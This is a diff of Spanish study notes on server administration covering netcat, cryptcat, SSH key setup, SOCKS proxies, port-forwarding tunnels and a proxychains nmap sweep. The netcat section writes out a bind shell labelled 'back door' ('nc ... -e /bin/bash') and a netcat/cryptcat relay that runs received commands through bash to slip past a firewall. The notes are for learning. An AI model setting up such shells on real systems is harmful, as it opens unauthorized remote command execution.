@@ -1,19 +1,5 @@
 
-ADMINISTRACIÓN DE SERVIDORES
-
-Escucho en el puerto 9898 y transfiero por el 80, de modo que esta máquina ahora al conectarse a localhost:9898
- va a mostrar el sitio que está emitiendo también por el 80
-
-	ssh -Ng -L9898:localhost:80 -i ,ssh/clave.pem   [-N para que quede en segundo plano]
-
-Mostrar por puerto 10022 lo que ocurre en localhost
-	ssh -NR 10022:localhost:22 platzi
-
-	ssh -p10022 usuario@localhost
-
-
-
-|Redirecciones y Tuberías|
+|NETCAT: Redirecciones y Tuberías|
 
 Archiva el resultado del comando en un fichero:
 ls > archivo
@@ -29,6 +15,95 @@ Enviar un archivo:
 [al que se conecte le enviará archivo001]               nc -l -v -p 8080 < archivo001
 [el que va a recibir se conecta a ese puerto]
 [hace una copia de archivo001, usar mismo nombre]       nc 127.0.0.1 8080 > archivo001
+
+
+nc [dominio] 80 [HEAD]   ... diferenciar dominio general de particular con www.
+
+[en servidor] nc -l -v -p 8080 [abre puerto -listening -verbose (solicitud de detalles) -port y registra]
+[en cliente]  nc 3.134.84.152 8080 [comienza chat vía puerto 8080]
+
+[en servidor] nc -l -v -p 8080 < archivo [que envíe la info que está en archivo]
+[en cliente]  nc 3.134.84.152 8080 > archivo [que reciba la info que está en archivo, por cierto puerto predeterminado]
+
+[en servidor] nc -l -u -vv -p 8080 [igual pero UDP en vez de TCP]
+[en cliente]  nc -u 3.134.84.152 8080
+
+[en servidor] nc -l -v -p 8080 -e /bin/bash [queda a la espera de ejecutar comandos a solicitud]
+[en cliente]  nc 3.134.84.152 8080 [ejecuta comandos en el servidor pero apoderándose de los resultados]
+back door
+Se bifurca para dispersar y así evitar al firewall...
+
+[en servidor]     nc -l -v -p 8080 | /bin/bash | cryptcat -l -v -p 9090
+[en cliente]      nc 127.0.0.1 8080
+[en otro cliente] nc 127.0.0.1 9090
+... desde un cliente se le envía un comando bash, el servidor lo ejecuta y envía al otro
+
+... con -k en vez de -l debería permanecer la conexión abierta luego de la ejecución, según wikipedia
+Desventaja de Netcat: todo va en texto plano, queda registrado, lo ven el firewall y el auditor humano [ver en wireshark]
+
+----------------------------------------------------------------------------------------------------------------------------------
+
+|Cryptcat|   [igual a netcat pero agrega una capa ssl]
+[en servidor] cryptcat -l -v -p 8080
+[en cliente]  cryptcat 127.0.0.1
+
+[en servidor] cryptcat -l -v -p 8080 | /bin/bash | cryptcat -l -v -p 9090
+[en cliente]  cryptcat 127.0.0.1 8080
+[en otro cliente] cryptcat 127.0.0.1 9090
+
+... y todo va cifrado
+
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+SECURE SHELL
+
+sudo apt-get install openssh-server
+sudo apt-get install openssh-client
+sudo systemctl enable ssh    o    sudo service ssh start
+
+ssh usuario@ip
+
+ssh-keygen    crea el par en home/.ssh
+copiar el certificado público en el servidor
+-pegar el contenido de id_rsa.pub en el archivo .ssh/authorized_keys del servidor
+-o también ssh-copy-id usuario@ip:
+ya no necesita contraseñas
+
+emular terminal: ssh -t usuario@ip irssi
+
+proxy sock en el servidor ssh en el navegador: ssh -D 9999 usuario@ip   (también configurar el navegador o el windows)
+
+correr la interfaz gráfica del sistema operativo del servidor:   ssh -X usuario:IP    (mac: XQuarz.app y windows requiren instalaciones)
+
+
+Windows: por default trae solo el cliente.
+Aplicaciones/Características Opcionales/Agregar/Instalar
+Iniciar desde Servicios (Aplicaciones)
+El password es el de la cuenta Microsoft
+
+
+Ingreso externo a sistema a través de otro que está adentro:
+Hay una IP pública y dos IP privadas (1 es la accesible y 2 la inaccesible desde el exterior)
+server externo:   ssh -L 2020:ipprivada2:22 usuario@ipprivada1
+server externo:   ssh -p 2020 usuario@localhost
+
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Escucho en el puerto 9898 y transfiero por el 80, de modo que esta máquina ahora al conectarse a localhost:9898
+ va a mostrar el sitio que está emitiendo también por el 80
+
+	ssh -Ng -L9898:localhost:80 -i ,ssh/clave.pem   [-N para que quede en segundo plano]
+
+Mostrar por puerto 10022 lo que ocurre en localhost
+	ssh -NR 10022:localhost:22 platzi
+
+	ssh -p10022 usuario@localhost
+
+
+
 
 
 
@@ -61,6 +136,7 @@ Volver a mirar 08x04
 [descargar Terminator]---------------------------------------------------------------------------------------------
 
 netstat -ntpl   [ver puertos, servicio ssh por puerto 22 tiene que estar habilitado]
+netstat -a      [windows]
 [] ssh -l root 192.168.57.2 -L 24:192.168.10.86:22  [IP propia eth0, IP propia eth1]
 [cuando me conecto a esta ip por ssh, pueda ver la otra ip por puerto 24 que está cerrado]
 
@@ -97,45 +173,6 @@ ssh -l root 127.0.0.1 -D 9090
 ping 8.8.8.8   [para que no caiga la conexión]
 netstat -ntpl
 proxychains nmap -sP 192.168.57.0/27   [túnel]  sP es escaneo usando ping
-
-----------------------------------------------------------------------------------------------
-
-|Netcat|
-nc [dominio] 80 [HEAD]   ... diferenciar dominio general de particular con www.
-
-[en servidor] nc -l -v -p 8080 [abre puerto -listening -verbose (solicitud de detalles) -port y registra]
-[en cliente]  nc 3.134.84.152 8080 [comienza chat vía puerto 8080]
-
-[en servidor] nc -l -v -p 8080 < archivo [que envíe la info que está en archivo]
-[en cliente]  nc 3.134.84.152 8080 > archivo [que reciba la info que está en archivo, por cierto puerto predeterminado]
-
-[en servidor] nc -l -u -vv -p 8080 [igual pero UDP en vez de TCP]
-[en cliente]  nc -u 3.134.84.152 8080
-
-[en servidor] nc -l -v -p 8080 -e /bin/bash [queda a la espera de ejecutar comandos a solicitud]
-[en cliente]  nc 3.134.84.152 8080 [ejecuta comandos en el servidor pero apoderándose de los resultados]
-back door
-Se bifurca para dispersar y así evitar al firewall...
-
-[en servidor]     nc -l -v -p 8080 | /bin/bash | cryptcat -l -v -p 9090
-[en cliente]      nc 127.0.0.1 8080
-[en otro cliente] nc 127.0.0.1 9090
-... desde un cliente se le envía un comando bash, el servidor lo ejecuta y envía al otro
-
-... con -k en vez de -l debería permanecer la conexión abierta luego de la ejecución, según wikipedia
-Desventaja de Netcat: todo va en texto plano, queda registrado, lo ven el firewall y el auditor humano [ver en wireshark]
-
-----------------------------------------------------------------------------------------------------------------------------------
-
-|Cryptcat|   [igual a netcat pero agrega una capa ssl]
-[en servidor] cryptcat -l -v -p 8080
-[en cliente]  cryptcat 127.0.0.1
-
-[en servidor] cryptcat -l -v -p 8080 | /bin/bash | cryptcat -l -v -p 9090
-[en cliente]  cryptcat 127.0.0.1 8080
-[en otro cliente] cryptcat 127.0.0.1 9090
-
-... y todo va cifrado
 
 
 ----------------------------------------------------------------------------------------------------------------------------------
